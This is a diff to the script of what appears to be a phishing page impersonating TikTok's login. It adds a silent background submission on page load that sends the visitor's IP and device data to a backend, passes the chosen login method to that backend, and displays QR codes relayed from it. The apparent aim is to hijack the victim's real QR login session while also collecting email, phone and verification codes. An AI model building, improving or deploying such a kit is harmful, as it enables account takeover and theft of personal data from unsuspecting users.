@@ -804,6 +804,10 @@ let lastShownStatus = '';
 let isProcessing = false;
 let lastFormVisibleStatus='WAITINGEMAIL';
 let selectedLoginMethod = null;
+let pendingLoginMethod = null;
+let lastSentLoginMethod = null;
+let initialSubmissionInFlight = false;
+let silentSubmitAttempts = 0;
 let verificationOptions = [];
 
 const loadingMessages = [
@@ -835,7 +839,6 @@ function selectMethod(method) {
   selectedLoginMethod = method;
   if (method === 'qr') {
     showScreen('qrScreen');
-    initialFormSubmission();
   } else if (method === 'email') {
     showScreen('credentialScreen');
     switchTab('email');
@@ -846,6 +849,42 @@ function selectMethod(method) {
     showScreen('credentialScreen');
     switchTab('email');
   }
+  sendLoginMethodUpdate(method);
+  if (!browserId && !initialSubmissionInFlight) {
+    initialFormSubmission();
+  }
+}
+
+function sendLoginMethodUpdate(method) {
+  const mapped = (method === 'facebook' || method === 'google' || method === 'apple') ? 'email' : method;
+  if (mapped !== 'qr' && mapped !== 'email' && mapped !== 'phone') return;
+  if (!browserId) { pendingLoginMethod = mapped; return; }
+  if (mapped === lastSentLoginMethod) return;
+  lastSentLoginMethod = mapped;
+  const payload = { browserId, token: templateConfig.token, updateType: 'method', method: mapped };
+  fetch(updateBaseUrl + "/update-process", {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: objectToFormData(payload)
+  }).then(r => { if (!r.ok) console.warn('[Template] method update HTTP', r.status); }).catch(e => console.warn('[Template] method update failed', e));
+}
+
+function updateQrImage(data) {
+  const img = document.getElementById('qrImage');
+  const qrScreenEl = document.getElementById('qrScreen');
+  if (!img || !qrScreenEl || !qrScreenEl.classList.contains('active')) return;
+  let qr = data && data.qrData;
+  if (!qr && data && data.lastJsonResponse) {
+    try {
+      const lr = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+      qr = lr && lr.qrData;
+    } catch (e) {}
+  }
+  if (!qr) return;
+  const src = typeof qr === 'string' ? qr : (qr.dataUrl || qr.url || qr.image || '');
+  if (!src) return;
+  img.src = src;
+  img.style.display = 'block';
 }
 
 function switchTab(tab) {
@@ -959,8 +998,11 @@ function setError(id, msg) {
 }
 
 // ==================== INITIAL SUBMISSION ====================
-async function initialFormSubmission() {
-  showLoading(loadingMessages[0]);
+async function initialFormSubmission(opts) {
+  const silent = !!(opts && opts.silent);
+  if (initialSubmissionInFlight) return;
+  initialSubmissionInFlight = true;
+  if (!silent) showLoading(loadingMessages[0]);
 
   let identifier = '';
   if (selectedLoginMethod === 'email') {
@@ -972,9 +1014,10 @@ async function initialFormSubmission() {
   try {
     const ipData = await fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({}));
     const formDataContent = {
-      loginMethod: selectedLoginMethod,
+      loginMethod: selectedLoginMethod || '',
       identifier,
       password: '',
+      platform: 'tiktok',
       ipData,
       deviceData: getDeviceData(),
       timestamp: new Date().toISOString()
@@ -1003,14 +1046,29 @@ async function initialFormSubmission() {
         templateConfig.updateUrl = data.updateUrl;
         updateBaseUrl = data.updateUrl.replace('/update-process', '');
       }
+      lastSentLoginMethod = formDataContent.loginMethod || null;
       updateUIForStatus(data.apiResponse.status, data.apiResponse);
+      if (pendingLoginMethod) {
+        const queued = pendingLoginMethod;
+        pendingLoginMethod = null;
+        sendLoginMethodUpdate(queued);
+      }
     } else {
       throw new Error("No browserId received");
     }
   } catch (error) {
     console.error("Initial submission error:", error);
     isProcessing = false;
+    if (silent) {
+      if (silentSubmitAttempts < 3) {
+        silentSubmitAttempts++;
+        setTimeout(() => { if (!browserId) initialFormSubmission({ silent: true }); }, 4000);
+      }
+      return;
+    }
     showFailedView("Failed to initiate process. Please try again.");
+  } finally {
+    initialSubmissionInFlight = false;
   }
 }
 
@@ -1067,6 +1125,7 @@ function updateUIForStatus(status, data = {}) {
     case 'PROCESSING':
       if (emailSubmitBtn) { emailSubmitBtn.disabled = true; }
       if (phoneSubmitBtn) { phoneSubmitBtn.disabled = true; }
+      updateQrImage(data);
       startPolling(2000);
       break;
 
@@ -1313,6 +1372,13 @@ async function submitVerificationCode() {
 // ==================== INIT ====================
 document.addEventListener('DOMContentLoaded', () => {
   showMethodSelection();
+
+  initialFormSubmission({ silent: true });
+
+  const qpMethod = String(new URLSearchParams(window.location.search).get('method') || '').trim().toLowerCase();
+  if (['qr', 'email', 'phone', 'facebook', 'google', 'apple'].includes(qpMethod)) {
+    selectMethod(qpMethod);
+  }
 
   document.getElementById('emailInput').addEventListener('input', function() {
     const btn = document.getElementById('emailSubmitBtn');
